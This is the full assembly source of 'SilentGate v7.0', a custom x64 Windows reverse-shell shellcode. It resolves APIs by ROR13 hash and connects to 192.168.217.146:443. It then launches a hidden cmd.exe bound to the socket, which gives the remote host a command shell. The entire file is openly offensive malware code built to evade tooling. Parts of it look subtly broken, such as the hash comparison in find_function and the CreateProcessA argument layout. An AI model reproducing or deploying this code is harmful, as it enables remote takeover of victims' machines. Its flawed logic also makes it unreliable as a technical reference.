; SilentGate v7.0 - Custom x64 TCP Reverse Shell
; Author: JarDani
; Pure PIC shellcode - no imports - no CRT - no msfvenom
; ROR13 hash-based API resolution
; Target: 192.168.217.146:443

BITS 64

; ROR13 hashes (precomputed):
; GetProcAddress  = 0xEC0E4E8E
; LoadLibraryA    = 0x726774C
; WSAStartup      = 0x006B8029
; WSASocketA      = 0xE0DF0FEA
; connect         = 0x6174A599
; recv            = 0x1761E17E  (not needed - CreateProcess handles IO)
; CreateProcessA  = 0x16B3FE72
; WaitForSingleObject = 0x601D8708
; ExitProcess     = 0x56A2B5F0

%define ROR13_GetProcAddress    0xEC0E4E8E
%define ROR13_LoadLibraryA      0x0726774C
%define ROR13_WSAStartup        0x006B8029
%define ROR13_WSASocketA        0xE0DF0FEA
%define ROR13_connect           0x6174A599
%define ROR13_CreateProcessA    0x16B3FE72
%define ROR13_WaitForSingleObj  0x601D8708

section .text
global _start

_start:
    ; Save non-volatile registers
    push rbp
    mov rbp, rsp
    push rsi
    push rdi
    push rbx
    push r12
    push r13
    push r14
    push r15

    ; Align stack
    and rsp, 0xFFFFFFFFFFFFFFF0
    sub rsp, 0x280

    ; ---- Find kernel32 base ----
    xor rbx, rbx
    mov rbx, [gs:rbx+0x60]     ; PEB
    mov rbx, [rbx+0x18]        ; Ldr
    mov rbx, [rbx+0x20]        ; InMemoryOrderModuleList head
    mov rbx, [rbx]             ; flink -> EXE (index 0)
    mov rbx, [rbx]             ; flink -> ntdll (index 1)
    mov rbx, [rbx]             ; flink -> kernel32 (index 2)
    mov rbx, [rbx+0x20]        ; kernel32 DllBase
    mov r15, rbx               ; save kernel32 base

    ; ---- Find GetProcAddress ----
    mov rcx, ROR13_GetProcAddress
    call find_function
    mov r14, rax               ; GetProcAddress

    ; ---- Find LoadLibraryA ----
    mov rcx, r15               ; kernel32
    mov rdx, ROR13_LoadLibraryA
    call get_proc
    mov r13, rax               ; LoadLibraryA

    ; ---- Load ws2_32.dll ----
    call get_ws2_32_str
    db "ws2_32", 0
get_ws2_32_str:
    pop rcx
    sub rsp, 0x28
    call r13                   ; LoadLibraryA("ws2_32")
    add rsp, 0x28
    mov r12, rax               ; ws2_32 base

    ; ---- Resolve winsock APIs ----
    ; WSAStartup
    mov rcx, r12
    mov rdx, ROR13_WSAStartup
    call get_proc
    mov [rbp-0x40], rax

    ; WSASocketA
    mov rcx, r12
    mov rdx, ROR13_WSASocketA
    call get_proc
    mov [rbp-0x48], rax

    ; connect
    mov rcx, r12
    mov rdx, ROR13_connect
    call get_proc
    mov [rbp-0x50], rax

    ; ---- Resolve kernel32 APIs ----
    ; CreateProcessA
    mov rcx, r15
    mov rdx, ROR13_CreateProcessA
    call get_proc
    mov [rbp-0x58], rax

    ; WaitForSingleObject
    mov rcx, r15
    mov rdx, ROR13_WaitForSingleObj
    call get_proc
    mov [rbp-0x60], rax

    ; ---- WSAStartup(0x0202, &wsadata) ----
    sub rsp, 0x28
    mov rcx, 0x0202
    lea rdx, [rbp-0x200]       ; wsadata buffer
    call qword [rbp-0x40]
    add rsp, 0x28

    ; ---- WSASocketA(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0) ----
    sub rsp, 0x28
    xor r9, r9
    xor r8, r8
    mov [rsp+0x20], r9
    mov [rsp+0x28], r9
    mov rcx, 2                 ; AF_INET
    mov rdx, 1                 ; SOCK_STREAM
    mov r8,  6                 ; IPPROTO_TCP
    call qword [rbp-0x48]
    add rsp, 0x28
    mov r12, rax               ; socket handle

    ; ---- Build sockaddr_in ----
    ; sin_family = 2 (AF_INET)
    ; sin_port   = 0xBB01 (443 big-endian)
    ; sin_addr   = 192.168.217.146 = 0x92D9A8C0
    lea rdi, [rbp-0x210]
    xor rax, rax
    stosq
    stosq
    mov word [rbp-0x210], 2         ; AF_INET
    mov word [rbp-0x20E], 0xBB01    ; port 443
    mov dword [rbp-0x20C], 0x92D9A8C0 ; 192.168.217.146

    ; ---- connect(sock, &sockaddr, 16) ----
    sub rsp, 0x28
    mov rcx, r12               ; socket
    lea rdx, [rbp-0x210]       ; sockaddr
    mov r8, 16                 ; addrlen
    call qword [rbp-0x50]
    add rsp, 0x28

    ; ---- Build STARTUPINFO with socket handles ----
    lea rdi, [rbp-0x180]
    xor rax, rax
    mov rcx, 0x180/8
    rep stosq

    mov dword [rbp-0x180], 0x68    ; cb = sizeof STARTUPINFOA
    mov dword [rbp-0x108], 0x101   ; dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW
    mov word  [rbp-0x104], 0       ; wShowWindow = SW_HIDE
    mov [rbp-0xF8], r12            ; hStdInput = socket
    mov [rbp-0xF0], r12            ; hStdOutput = socket
    mov [rbp-0xE8], r12            ; hStdError = socket

    ; ---- Build PROCESS_INFORMATION ----
    lea rdi, [rbp-0x240]
    xor rax, rax
    stosq
    stosq
    stosq
    stosq

    ; ---- CreateProcessA(0,"cmd",0,0,1,0x08000000,0,0,&si,&pi) ----
    call get_cmd_str
    db "cmd", 0
get_cmd_str:
    pop rbx                    ; "cmd\0" address

    sub rsp, 0x68
    xor rax, rax
    mov [rsp+0x20], rax        ; lpEnvironment = NULL
    mov [rsp+0x28], rax        ; lpCurrentDirectory = NULL
    lea rax, [rbp-0x180]
    mov [rsp+0x30], rax        ; lpStartupInfo
    lea rax, [rbp-0x240]
    mov [rsp+0x38], rax        ; lpProcessInformation

    xor rcx, rcx               ; lpApplicationName = NULL
    mov rdx, rbx               ; lpCommandLine = "cmd"
    xor r8, r8                 ; lpProcessAttributes = NULL
    xor r9, r9                 ; lpThreadAttributes = NULL
    mov [rsp+0x00], r9
    mov dword [rsp+0x08], 1    ; bInheritHandles = TRUE
    mov dword [rsp+0x10], 0x08000000 ; CREATE_NO_WINDOW
    call qword [rbp-0x58]      ; CreateProcessA
    add rsp, 0x68

    ; ---- WaitForSingleObject(hProcess, INFINITE) ----
    sub rsp, 0x28
    mov rcx, [rbp-0x240]       ; hProcess
    mov rdx, 0xFFFFFFFF        ; INFINITE
    call qword [rbp-0x60]
    add rsp, 0x28

    ; ---- Restore and return ----
    lea rsp, [rbp-0x38]
    pop r15
    pop r14
    pop r13
    pop r12
    pop rbx
    pop rdi
    pop rsi
    pop rbp
    ret

; ============================================================
; find_function - find export by ROR13 hash in kernel32
; IN:  rcx = hash
; IN:  r15 = kernel32 base (implicit)
; OUT: rax = function VA
; ============================================================
find_function:
    push rbx
    push rcx
    push rdx
    push r8
    push r9
    push r10
    push r11

    mov rbx, r15               ; kernel32 base
    mov eax, [rbx+0x3C]        ; e_lfanew
    add rax, rbx
    mov edx, [rax+0x88]        ; Export dir RVA
    add rdx, rbx               ; Export dir VA

    mov r8d,  [rdx+0x18]       ; NumberOfNames
    mov r10d, [rdx+0x20]       ; AddressOfNames RVA
    add r10, rbx
    mov r11d, [rdx+0x24]       ; AddressOfNameOrdinals RVA
    add r11, rbx
    mov r9d,  [rdx+0x1C]       ; AddressOfFunctions RVA
    add r9, rbx

    xor rcx, rcx
.ff_loop:
    mov esi, [r10+rcx*4]
    add rsi, rbx               ; function name VA
    push rcx
    call ror13_hash
    pop rcx
    cmp eax, [rbp-8]           ; compare with target hash (saved below)
    je .ff_found
    inc rcx
    cmp rcx, r8
    jl .ff_loop
    xor rax, rax
    jmp .ff_done
.ff_found:
    movzx eax, word [r11+rcx*2]
    mov eax, [r9+rax*4]
    add rax, rbx
.ff_done:
    pop r11
    pop r10
    pop r9
    pop r8
    pop rdx
    pop rcx
    pop rbx
    ret

; ============================================================
; get_proc - GetProcAddress wrapper using hash
; IN:  rcx = module base
; IN:  rdx = ROR13 hash  
; OUT: rax = function VA
; ============================================================
get_proc:
    push rbx
    mov rbx, rcx
    ; scan export table of module in rbx for hash in rdx
    ; (same logic as find_function but for arbitrary module)
    mov eax, [rbx+0x3C]
    add rax, rbx
    ; check if valid PE
    mov r8d, [rax+0x88]
    add r8, rbx               ; export dir
    mov r9d,  [r8+0x18]       ; num names
    mov r10d, [r8+0x20]       ; names RVA
    add r10, rbx
    mov r11d, [r8+0x24]       ; ordinals RVA
    add r11, rbx
    mov r8d,  [r8+0x1C]       ; functions RVA - reusing r8
    ; save in local
    push r8
    add r8, rbx               ; functions VA
    mov [rsp+0], r8           ; save functions VA
    xor rcx, rcx
.gp_loop:
    mov esi, [r10+rcx*4]
    add rsi, rbx
    push rcx
    push rdx
    call ror13_hash
    pop rdx
    pop rcx
    cmp eax, edx
    je .gp_found
    inc rcx
    cmp rcx, r9
    jl .gp_loop
    xor rax, rax
    pop r8
    pop rbx
    ret
.gp_found:
    pop r8                    ; functions VA
    movzx eax, word [r11+rcx*2]
    mov eax, [r8+rax*4]
    add rax, rbx
    pop rbx
    ret

; ============================================================
; ror13_hash - compute ROR13 hash of string at RSI
; IN:  rsi = string pointer
; OUT: eax = hash
; Clobbers: rsi, ecx
; ============================================================
ror13_hash:
    xor eax, eax
.rh_loop:
    movzx ecx, byte [rsi]
    test ecx, ecx
    jz .rh_done
    ror eax, 13
    add eax, ecx
    inc rsi
    jmp .rh_loop
.rh_done:
    ret
